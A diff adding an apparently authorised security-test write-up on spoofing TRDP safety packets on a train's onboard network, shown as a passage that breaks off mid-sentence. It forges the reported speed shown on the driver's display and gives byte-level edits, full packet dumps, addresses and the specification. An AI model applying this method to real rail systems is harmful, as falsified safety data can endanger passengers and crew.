@@ -1,0 +1,240 @@
+I successfully changed the speed of the train from 50 mph to 45 mph.
+
+First, I connected dirac.depmod.net into Car 2 Router 1 (Router 1 == System 1). See photos.
+
+I used the following DHCP client identifier, which is not really necessary for spoofing:
+
+  # 0x5C (5C): Toilet (SST,UAT)
+  send dhcp-client-identifier 00:5C;
+
+[root@dirac ~]# ifconfig -a
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.128.128.92  netmask 255.255.192.0  broadcast 10.128.191.255
+        inet6 fe80::da3a:ddff:fe77:c869  prefixlen 64  scopeid 0x20<link>
+        ether d8:3a:dd:77:c8:69  txqueuelen 1000  (Ethernet)
+        RX packets 1066019  bytes 426425756 (406.6 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10452  bytes 2523034 (2.4 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 17050  bytes 1381804 (1.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 17050  bytes 1381804 (1.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.255.254  netmask 255.255.255.0  broadcast 192.168.255.255
+        ether d8:3a:dd:77:c8:6a  txqueuelen 1000  (Ethernet)
+        RX packets 614007  bytes 33085229 (31.5 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3791838  bytes 652920186 (622.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[root@dirac ~]# route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.128.0.0      10.128.128.20   255.240.0.0     UG    0      0        0 eth0
+10.128.128.0    0.0.0.0         255.255.192.0   U     0      0        0 eth0
+192.168.255.0   0.0.0.0         255.255.255.0   U     600    0        0 wlan0
+
+I then injected thew new speed as follows, using trdpSpoofer.py.
+
+----------------------------------------------------------------------------------------------------------
+Received UDP Packet #31 (Payload: 200-bytes):
+  10.128.64.25:52301 (00:00:87:4e:89:96) -> 239.1.13.1:52301 (01:00:5e:01:0d:01)
+
+Modified TRDP Header:
+  Incremented sequenceCounter: 373937 (0005b4b1) -> 373938 (0005b4b2)
+  Modified byte #0: 00 -> 00
+  Modified byte #1: 05 -> 05
+  Modified byte #2: b4 -> b4
+  Modified byte #3: b1 -> b2
+
+Setting fake speed: 45.0 mph (450) / 72.4 kph (724) -> 02d4
+
+Modified TRDP Dataset (re-calculated checksum):
+  Modified byte #66: 31 -> 32
+  Modified byte #104: 03 -> 02
+  Modified byte #105: 2a -> d4
+  Modified byte #152: 3a -> 38
+  Modified byte #153: bb -> 45
+
+Original UDP Payload (Header: 32-bytes; Dataset: 164-bytes; FCS: 4-bytes)
+   Header: 00 05 b4 b1 01 00 50 64 01 19 01 00 21 58 80 78 00 00 00 a4 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 19 00 00 a0 00 00 00 00 19 00 00 2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 00 00 02 00 01 00 00
+  Dataset: 20 32 31 00 00 54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 28 f7 00 00 03 2a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3a bb 00 00 19 00 00 02
+  Dataset: 00 02 00 00 
+      FCS: c0 3d 03 a6
+
+Modified UDP Payload (Header: 32-bytes; Dataset: 164-bytes; FCS: 4-bytes)
+   Header: 00 05 b4 b2 01 00 50 64 01 19 01 00 21 58 80 78 00 00 00 a4 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 19 00 00 a0 00 00 00 00 19 00 00 2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 00 00 02 00 01 00 00
+  Dataset: 20 32 32 00 00 54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 28 f7 00 00 02 d4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Dataset: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 45 00 00 19 00 00 02
+  Dataset: 00 02 00 00 
+      FCS: 81 be 7b 06
+
+Injected UDP Packet (Payload: 200-bytes):
+  10.128.64.25:52301 (00:00:87:9e:af:1e) -> 239.1.13.1:52301 (01:00:5e:01:0d:01)
+----------------------------------------------------------------------------------------------------------
+
+Note the changed but spoofed source MAC address (set to the manufacturer). Not the same as the original but used to prevent a packet storm!
+
+The spoofed packet required modifying the TRDP sequenceCounter; and the sequence counter, speed and checksum bytes in the dataset (see trdpSpoofer.py on dirac.depmod.net).
+
+The speed change was shown on the driver's display. See photos, with speed changing from 50 to 45 mph.
+
+I captured TRDP packets containing Common Data in Car 4 Router 1 (Router 1 == System 1). 
+
+The mofidied speed is included in the Common Data, which is also shown in the driver's desk photos (032a -> 02d4). This demonstrates that the changed speed is accepted and re-broadcast by the TC (10.128.64.21) as the actual train speed. This may be used by other end devices.
+
+>>> TRDP UDP PD PDU RECEIVED 10.128.64.21:51120 -> 239.1.1.20:51120 (#1149) <<<
+    packetCount      = 1149
+    timestamp        = 1708506530.3137488
+    fingerprint      = 2448950a3d103be4d3111c982af90ffa | Packet: 1149 | Timestamp: 1708506530.3137488 | Pr: PD Request | System 1 for Safety Data | Flags: +SDR
+    lengths          = Ethernet: 358-bytes/2864-bits | IP: 344-bytes/2752-bits | UDP: 324-bytes/2592-bits | TRDP: 316-bytes/2528-bits
+    ------------------------------------------------------------------
+    srcMacAddr       = 00:00:87:4E:66:A8
+    srcInetAddr      = 10.128.64.21
+    srcPort          = 51120
+    transmissionLine = 0 [System 1]
+    subnetId         = 1
+    networkUnit      = 0 [First Unit]
+    vehicleId        = 1
+    deviceId         = 21 [TMS Train controller]
+    ------------------------------------------------------------------
+    dstMacAddr       = 01:00:5E:01:01:14
+    dstInetAddr      = 239.1.1.20
+    dstPort          = 51120
+    transmissionLine = 1 [System 1 for Safety Data]
+    frameType        = 1 [Safety Data SDR (Short Period)]
+    destinationGroup = 20 [Non TMS and Leading Car Apparatus: (1) Traction; (2) APS; (3) Toilet; (4) PIIS; (5) OBS; (6) Catering; (7) TMS Vehicle I/F Unit]
+    ------------------------------------------------------------------
+    sequenceCounter  = 3739502
+    protocolVersion  = 1.0
+    msgType          = 5072 [Pr: PD Request]
+    comId            = 18158592 [unknown]
+    topoCount        = 559448184
+    datasetLength    = 280-bytes/2240-bits [0-bytes/0-bits of padding]
+    reserved01       = 0
+    replyIpAddress   = 0.0.0.0
+    fcs              = 63716209 [valid]
+    ------------------------------------------------------------------
+    dataset (binary) = 111111110000001000000000001011000000000100000010000010100000101100001100000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000100100000000100010000100001001
+                       000100000000001100000000000000000100000000000001000000000110010001000000000000000000000000000000
+                       000001010000000000000000000000000000001011010100000000000000000000000000000000000000000000000000
+                       001010000000000000000000001001000011001000000100000000000000000000000000000000000000000000000000
+                       000100000000001000000000000000000000000000000000000111100001111000000001000000000000000000000000
+                       111111111111111111111111111111110000000000000101000001011101110000000000000000000000000000000000
+                       000000000000000000000000000000000011110000000000000000000010010001010001000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000011100000000000000000010010100
+                       000111000000000000000000100100000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+                       00000000000000000000000000000000
+                       -----------------------------------------------
+    dataset (hex)    = ff 02 00 2c 01 02 0a 0b 0c 00 00 00 00 00 00 00 00 00 00 00 24 02 21 09 10 03 00 00 40 01 00 64
+                       40 00 00 00 05 00 00 00 02 d4 00 00 00 00 00 00 28 00 00 24 32 04 00 00 00 00 00 00 10 02 00 00
+                       00 00 1e 1e 01 00 00 00 ff ff ff ff 00 05 05 dc 00 00 00 00 00 00 00 00 3c 00 00 24 51 00 00 00
+                       00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       1c 00 00 94 1c 00 00 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    ------------------------------------------------------------------
+    Status Data Request (SDR)
+
+    ------ SDR COMMON DATA ------ = ----------------------------------
+    destinationDeviceIdInt        = 255
+    destinationDeviceIdDesc       = Destination Device ID of Common Data must be 255
+    projectCodeInt                = 2
+    projectCodeDesc               = IEP (ECML)
+    date                          = 21/02/24
+    time                          = 09:10:03
+    couplingUncouplingPrediction  = 0
+    dateTimeCorrection            = 0
+    pdSdrTypeDesc                 = Common Data (Safety) for CSV-SDR1 239.1.1.20 (System 1), CSV-SDR1 239.2.1.20 (System 2)
+    dataLengthInt                 = 44
+    dataLengthDesc                = Length of Common Data must be 44 bytes (bytes 4-47)
+    cabOnEndCarOfOtherSize        = 0
+    cabOnEndCarOfVS1              = 1
+    slowSpeedMode                 = 0
+    hillStartMode                 = 0
+    ddsPositionReverse            = 0
+    ddsPositionForward            = 0
+    changoverInProgress           = 0
+    changoverCompleted            = 0
+    constantSpeedBraking          = 0
+    constantSpeedPowering         = 0
+    speedLimitActive              = 0
+    powering                      = 0
+    braking                       = 1
+    firstUnitTrainTypeElectric    = 0
+    firstUnitTrainTypeBiMode      = 1
+    firstUnitLocomotiveHauledMode = 0
+    firstUnitRescueMode           = 0
+    firstUnitPowerType            = 0
+    numCarsNetworkUnitFirst       = 5
+    numCarsNetworkUnitSecond      = 0
+    trainSpeed                    = 724
+    trainSpeedDifference          = 0
+    tractiveEffort                = 0
+    brakeEffort                   = 0
+    -------- APPARATUS 1 -------- = ----------------------------------
+    apparatus1_deviceIdInt        = 40
+    apparatus1_deviceIdDesc       = Traction
+    apparatus1_headerLengthBytes  = 4
+    apparatus1_headerLengthBits   = 32
+    apparatus1_dataLengthBytes    = 36
+    apparatus1_dataLengthBits     = 288
+    apparatus1_data               = 32 04 00 00 00 00 00 00 10 02 00 00 00 00 1e 1e 01 00 00 00 ff ff ff ff 00 05 05 dc 00 00 00 00
+                                    00 00 00 00
+    -------- APPARATUS 2 -------- = ----------------------------------
+    apparatus2_deviceIdInt        = 60
+    apparatus2_deviceIdDesc       = APS
+    apparatus2_headerLengthBytes  = 4
+    apparatus2_headerLengthBits   = 32
+    apparatus2_dataLengthBytes    = 36
+    apparatus2_dataLengthBits     = 288
+    apparatus2_data               = 51 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                                    00 00 00 00
+    -------- APPARATUS 3 -------- = ----------------------------------
+    apparatus3_deviceIdInt        = 28
+    apparatus3_deviceIdDesc       = TMS Vehicle Interface Unit (Control System 1)
+    apparatus3_headerLengthBytes  = 4
+    apparatus3_headerLengthBits   = 32
+    apparatus3_dataLengthBytes    = 148
+    apparatus3_dataLengthBits     = 1184
+    apparatus3_data               = 1c 00 00 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+                                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    ------------------------------------------------------------------
+    TRDP Version = 0 : West Coast Partnership TMS for AT300 Ethernet Communication Interface Specification, Mito Works
+    Drawing Number 365-3E857140, XXXXXXX Limited, 01/02/2021 (XXXXXXX Class 800-807)
+
+NOTE: This attack does not work on System 2, as System 1 has priority over them both. There will be differences between in the packets sent over both systems. I assume the changes are detected as errors and dropped on System 2, but taken as authenti
